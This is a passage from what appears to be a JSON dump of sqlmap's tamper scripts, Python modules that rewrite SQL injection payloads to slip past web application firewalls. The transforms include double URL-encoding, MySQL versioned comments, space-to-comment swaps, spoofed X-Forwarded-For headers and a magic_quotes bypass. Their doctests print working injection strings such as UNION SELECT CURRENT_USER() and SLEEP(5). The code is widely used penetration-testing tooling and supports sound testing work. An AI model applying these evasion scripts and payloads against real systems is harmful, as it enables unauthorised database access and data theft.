re.search(r\"(?i)LIMIT\\s*(\\d+),\\s*(\\d+)\", payload or \"\")\n    if match:\n        retVal = retVal.replace(match.group(0), \"LIMIT %s OFFSET %s\" % (match.group(2), match.group(1)))\n\n    return retVal\n", "tamper/chardoubleencode.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport string\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)\n\n    Notes:\n        * Useful to bypass some weak web application firewalls that do not double URL-decode the request before processing it through their ruleset\n\n    >>> tamper('SELECT FIELD FROM%20TABLE')\n    '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        i = 0\n\n        while i < len(payload):\n            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:\n                retVal += '%%25%s' % payload[i + 1:i + 3]\n                i += 3\n            else:\n                retVal += '%%25%.2X' % ord(payload[i])\n                i += 1\n\n    return retVal\n", "tamper/base64encode.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import encodeBase64\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Base64-encodes all characters in a given payload\n\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    'MScgQU5EIFNMRUVQKDUpIw=='\n    \"\"\"\n\n    return encodeBase64(payload, binary=False) if payload else payload\n", "tamper/space2hash.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport random\nimport string\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n')\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 4.0, 5.0\n\n    Notes:\n        * Useful to bypass several web application firewalls\n        * Used during the ModSecurity SQL injection challenge,\n          http://modsecurity.org/demo/challenge.html\n\n    >>> random.seed(0)\n    >>> tamper('1 AND 9227=9227')\n    '1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227'\n    \"\"\"\n\n    retVal = \"\"\n\n    if payload:\n        for i in xrange(len(payload)):\n            if payload[i].isspace():\n                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))\n                retVal += \"%%23%s%%0A\" % randomStr\n            elif payload[i] == '#' or payload[i:i + 3] == '-- ':\n                retVal += payload[i:]\n                break\n            else:\n                retVal += payload[i]\n\n    return retVal\n", "tamper/commalessmid.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGH\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 5.0 and 5.5\n\n    >>> tamper('MID(VERSION(), 1, 1)')\n    'MID(VERSION() FROM 1 FOR 1)'\n    \"\"\"\n\n    retVal = payload\n\n    warnMsg = \"you should consider usage of switch '--no-cast' along with \"\n    warnMsg += \"tamper script '%s'\" % os.path.basename(__file__).split(\".\")[0]\n    singleTimeWarnMessage(warnMsg)\n\n    match = re.search(r\"(?i)MID\\((.+?)\\s*,\\s*(\\d+)\\s*\\,\\s*(\\d+)\\s*\\)\", payload or \"\")\n    if match:\n        retVal = retVal.replace(match.group(0), \"MID(%s FROM %s FOR %s)\" % (match.group(1), match.group(2), match.group(3)))\n\n    return retVal\n", "tamper/apostrophenullencode.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)\n\n    >>> tamper(\"1 AND '1'='1\")\n    '1 AND %00%271%00%27=%00%271'\n    \"\"\"\n\n    return payload.replace('\\'', \"%00%27\") if payload else payload\n", "tamper/htmlencode.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)\n\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'\n    >>> tamper(\"1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;\")\n    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'\n    \"\"\"\n\n    if payload:\n        payload = re.sub(r\"&#(\\d+);\", lambda match: chr(int(match.group(1))), payload)      # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5203\n        payload = re.sub(r\"[^\\w]\", lambda match: \"&#%d;\" % ord(match.group(0)), payload)\n\n    return payload\n", "tamper/space2dash.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport random\nimport string\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n')\n\n    Requirement:\n        * MSSQL\n        * SQLite\n\n    Notes:\n        * Useful to bypass several web application firewalls\n        * Used during the ZeroNights SQL injection challenge,\n          https://proton.onsec.ru/contest/\n\n    >>> random.seed(0)\n    >>> tamper('1 AND 9227=9227')\n    '1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227'\n    \"\"\"\n\n    retVal = \"\"\n\n    if payload:\n        for i in xrange(len(payload)):\n            if payload[i].isspace():\n                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))\n                retVal += \"--%s%%0A\" % randomStr\n            elif payload[i] == '#' or payload[i:i + 3] == '-- ':\n                retVal += payload[i:]\n                break\n            else:\n                retVal += payload[i]\n\n    return retVal\n", "tamper/xforwardedfor.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport random\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef randomIP():\n    octets = []\n\n    while not octets or octets[0] in (10, 172, 192):\n        octets = random.sample(xrange(1, 255), 4)\n\n    return '.'.join(str(_) for _ in octets)\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Append a fake HTTP header 'X-Forwarded-For' (and alike)\n    \"\"\"\n\n    headers = kwargs.get(\"headers\", {})\n    headers[\"X-Forwarded-For\"] = randomIP()\n    headers[\"X-Client-Ip\"] = randomIP()\n    headers[\"X-Real-Ip\"] = randomIP()\n    headers[\"CF-Connecting-IP\"] = randomIP()\n    headers[\"True-Client-IP\"] = randomIP()\n\n    # Reference: https://developer.chrome.com/multidevice/data-compression-for-isps#proxy-connection\n    headers[\"Via\"] = \"1.1 Chrome-Compression-Proxy\"\n\n    # Reference: https://wordpress.org/support/topic/blocked-country-gaining-access-via-cloudflare/#post-9812007\n    headers[\"CF-IPCountry\"] = random.sample(('GB', 'US', 'FR', 'AU', 'CA', 'NZ', 'BE', 'DK', 'FI', 'IE', 'AT', 'IT', 'LU', 'NL', 'NO', 'PT', 'SE', 'ES', 'CH'), 1)[0]\n\n    return payload\n", "tamper/0eunion.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of <int> UNION with <int>e0UNION\n\n    Requirement:\n        * MySQL\n        * MsSQL\n\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf\n\n    >>> tamper('1 UNION ALL SELECT')\n    '1e0UNION ALL SELECT'\n    \"\"\"\n\n    return re.sub(r\"(?i)(\\d+)\\s+(UNION )\", r\"\\g<1>e0\\g<2>\", payload) if payload else payload\n", "tamper/space2morehash.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport random\nimport re\nimport string\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.data import kb\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\nfrom lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s > 5.1.13\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n')\n\n    Requirement:\n        * MySQL >= 5.1.13\n\n    Tested against:\n        * MySQL 5.1.41\n\n    Notes:\n        * Useful to bypass several web application firewalls\n        * Used during the ModSecurity SQL injection challenge,\n          http://modsecurity.org/demo/challenge.html\n\n    >>> random.seed(0)\n    >>> tamper('1 AND 9227=9227')\n    '1%23RcDKhIr%0AAND%23upgPydUzKpMX%0A%23lgbaxYjWJ%0A9227=9227'\n    \"\"\"\n\n    def process(match):\n        word = match.group('word')\n        randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))\n\n        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:\n            return match.group().replace(word, \"%s%%23%s%%0A\" % (word, randomStr))\n        else:\n            return match.group()\n\n    retVal = \"\"\n\n    if payload:\n        payload = re.sub(r\"(?<=\\W)(?P<word>[A-Za-z_]+)(?=\\W|\\Z)\", process, payload)\n\n        for i in xrange(len(payload)):\n            if payload[i].isspace():\n                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))\n                retVal += \"%%23%s%%0A\" % randomStr\n            elif payload[i] == '#' or payload[i:i + 3] == '-- ':\n                retVal += payload[i:]\n                break\n            else:\n                retVal += payload[i]\n\n    return retVal\n", "tamper/versionedkeywords.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.data import kb\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHER\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Encloses each non-function keyword with (MySQL) versioned comment\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 4.0.18, 5.1.56, 5.5.11\n\n    Notes:\n        * Useful to bypass several web application firewalls when the\n          back-end database management system is MySQL\n\n    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')\n    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'\n    \"\"\"\n\n    def process(match):\n        word = match.group('word')\n        if word.upper() in kb.keywords:\n            return match.group().replace(word, \"/*!%s*/\" % word)\n        else:\n            return match.group()\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?<=\\W)(?P<word>[A-Za-z_]+)(?=[^\\w(]|\\Z)\", process, retVal)\n        retVal = retVal.replace(\" /*!\", \"/*!\").replace(\"*/ \", \"*/\")\n\n    return retVal\n", "tamper/charunicodeencode.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport string\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against ASP or ASP.NET web applications\" % os.path.basename(__file__).split(\".\")[0])\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)\n\n    Requirement:\n        * ASP\n        * ASP.NET\n\n    Tested against:\n        * Microsoft SQL Server 2000\n        * Microsoft SQL Server 2005\n        * MySQL 5.1.56\n        * PostgreSQL 9.0.3\n\n    Notes:\n        * Useful to bypass weak web application firewalls that do not unicode URL-decode the request before processing it through their ruleset\n\n    >>> tamper('SELECT FIELD%20FROM TABLE')\n    '%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        i = 0\n\n        while i < len(payload):\n            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:\n                retVal += \"%%u00%s\" % payload[i + 1:i + 3]\n                i += 3\n            else:\n                retVal += '%%u%.4X' % ord(payload[i])\n                i += 1\n\n    return retVal\n", "tamper/escapequotes.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Slash escape single and double quotes (e.g. ' -> \\')\n\n    >>> tamper('1\" AND SLEEP(5)#')\n    '1\\\\\\\\\" AND SLEEP(5)#'\n    \"\"\"\n\n    return payload.replace(\"'\", \"\\\\'\").replace('\"', '\\\\\"')\n", "tamper/equaltolike.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart\n\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that\n          filter the equal character ('=')\n        * The LIKE operator is SQL standard. Hence, this tamper script\n          should work against all (?) databases\n\n    >>> tamper('SELECT * FROM users WHERE id=1')\n    'SELECT * FROM users WHERE id LIKE 1'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"\\s*=\\s*\", \" LIKE \", retVal)\n\n    return retVal\n", "tamper/unmagicquotes.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)\n\n    Notes:\n        * Useful for bypassing magic_quotes/addslashes feature\n\n    Reference:\n        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string\n\n    >>> tamper(\"1' AND 1=1\")\n    '1%bf%27-- -'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        found = False\n        retVal = \"\"\n\n        for i in xrange(len(payload)):\n            if payload[i] == '\\'' and not found:\n                retVal += \"%bf%27\"\n                found = True\n            else:\n                retVal += payload[i]\n                continue\n\n        if found:\n            _ = re.sub(r\"(?i)\\s*(AND|OR)[\\s(]+([^\\s]+)\\s*(=|LIKE)\\s*\\2\", \"\", retVal)\n            if _ != retVal:\n                retVal = _\n                retVal += \"-- -\"\n            elif not any(_ in retVal for _ in ('#', '--', '/*')):\n                retVal += \"-- -\"\n    return retVal\n", "tamper/halfversionedmorekeywords.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.data import kb\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\nfrom lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS\n\n__priority__ = PRIORITY.HIGHER\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s < 5.1\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Adds (MySQL) versioned comment before each keyword\n\n    Requirement:\n        * MySQL < 5.1\n\n    Tested against:\n        * MySQL 4.0.18, 5.0.22\n\n    Notes:\n        * Useful to bypass several web application firewalls when the\n          back-end database management system is MySQL\n        * Used during the ModSecurity SQL injection challenge,\n          http://modsecurity.org/demo/challenge.html\n\n    >>> tamper(\"value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa\")\n    \"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa\"\n    \"\"\"\n\n    def process(match):\n        word = match.group('word')\n        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:\n            return match.group().replace(word, \"/*!0%s\" % word)\n        else:\n            return match.group()\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?<=\\W)(?P<word>[A-Za-z_]+)(?=\\W|\\Z)\", process, retVal)\n        retVal = retVal.replace(\" /*!0\", \"/*!0\")\n\n    return retVal\n", "tamper/sleep2getlock.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import kb\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'SLEEP(5)' with (e.g.) \"GET_LOCK('ETgP',5)\"\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 5.0 and 5.5\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that filter the SLEEP() and BENCHMARK() functions\n\n        * Reference: https://zhuanlan.zhihu.com/p/35245598\n\n    >>> tamper('SLEEP(5)') == \"GET_LOCK('%s',5)\" % kb.aliasName\n    True\n    \"\"\"\n\n    if payload:\n        payload = payload.replace(\"SLEEP(\", \"GET_LOCK('%s',\" % kb.aliasName)\n\n    return payload\n", "tamper/ifnull2casewhenisnull.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'doc/COPYING' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart\n\n    Requirement:\n        * MySQL\n        * SQLite (possibly)\n        * SAP MaxDB (possibly)\n\n    Tested against:\n        * MySQL 5.0 and 5.5\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that filter the IFNULL() functions\n\n    >>> tamper('IFNULL(1, 2)')\n    'CASE WHEN ISNULL(1) THEN (2) ELSE (1) END'\n    \"\"\"\n\n    if payload and payload.find(\"IFNULL\") > -1:\n        while payload.find(\"IFNULL(\") > -1:\n            index = payload.find(\"IFNULL(\")\n            depth = 1\n            comma, end = None, None\n\n            for i in xrange(index + len(\"IFNULL(\"), len(payload)):\n                if depth == 1 and payload[i] == ',':\n                    comma = i\n\n                elif depth == 1 and payload[i] == ')':\n                    end = i\n                    break\n\n                elif payload[i] == '(':\n                    depth += 1\n\n                elif payload[i] == ')':\n                    depth -= 1\n\n            if comma and end:\n                _ = payload[index + len(\"IFNULL(\"):comma]\n                __ = payload[comma + 1:end].lstrip()\n                newVal = \"CASE WHEN ISNULL(%s) THEN (%s) ELSE (%s) END\" % (_, __, _)\n                payload = payload[:index] + newVal + payload[end + 1:]\n            else:\n                break\n\n    return payload\n", "tamper/plus2fnconcat.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import zeroDepthSearch\nfrom lib.core.compat import xrange\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MSSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart\n\n    Tested against:\n        * Microsoft SQL Server 2008\n\n    Requirements:\n        * Microsoft SQL Server 2008+\n\n    Notes:\n        * Useful in case ('+') character is filtered\n        * https://msdn.microsoft.com/en-us/library/bb630290.aspx\n\n    >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')\n    'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'\n\n    >>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')\n    '1 UNION ALL SELECT NULL,NULL,{fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT(CHAR(113),CHAR(118))},CHAR(112))},CHAR(112))},CHAR(113))},ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)))},CHAR(113))},CHAR(112))},CHAR(107))},CHAR(112))},CHAR(113))}-- qtfe'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        match = re.search(r\"('[^']+'|CHAR\\(\\d+\\))\\+.*(?<=\\+)('[^']+'|CHAR\\(\\d+\\))\", retVal)\n        if match:\n            old = match.group(0)\n            parts = []\n            last = 0\n\n            for index in zeroDepthSearch(old, '+'):\n                parts.append(old[last:index].strip('+'))\n                last = index\n\n            parts.append(old[last:].strip('+'))\n            replacement = parts[0]\n\n            for i in xrange(1, len(parts)):\n                replacement = \"{fn CONCAT(%s,%s)}\" % (replacement, parts[i])\n\n            retVal = retVal.replace(old, replacement)\n\n    return retVal\n", "tamper/multiplespaces.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport random\nimport re\n\nfrom lib.core.data import kb\nfrom lib.core.datatype import OrderedSet\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Adds multiple spaces (' ') around SQL keywords\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that has poorly written permissive regular expressions\n\n    Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt\n\n    >>> random.seed(0)\n    >>> tamper('1 UNION SELECT foobar')\n    '1     UNION     SELECT     foobar'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        words = OrderedSet()\n\n        for match in re.finditer(r\"\\b[A-Za-z_]+\\b\", payload):\n            word = match.group()\n\n            if word.upper() in kb.keywords:\n                words.add(word)\n\n        for word in words:\n            retVal = re.sub(r\"(?<=\\W)%s(?=[^A-Za-z_(]|\\Z)\" % word, \"%s%s%s\" % (' ' * random.randint(1, 4), word, ' ' * random.randint(1, 4)), retVal)\n            retVal = re.sub(r\"(?<=\\W)%s(?=[(])\" % word, \"%s%s\" % (' ' * random.randint(1, 4), word), retVal)\n\n    return retVal\n", "tamper/space2morecomment.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with comments '/**_**/'\n\n    Tested against:\n        * MySQL 5.0 and 5.5\n\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls\n\n    >>> tamper('SELECT id FROM users')\n    'SELECT/**_**/id/**_**/FROM/**_**/users'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += \"/**_**/\"\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += \"/**_**/\"\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n", "tamper/space2mysqldash.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n')\n\n    Requirement:\n        * MySQL\n        * MSSQL\n\n    Notes:\n        * Useful to bypass several web application firewalls.\n\n    >>> tamper('1 AND 9227=9227')\n    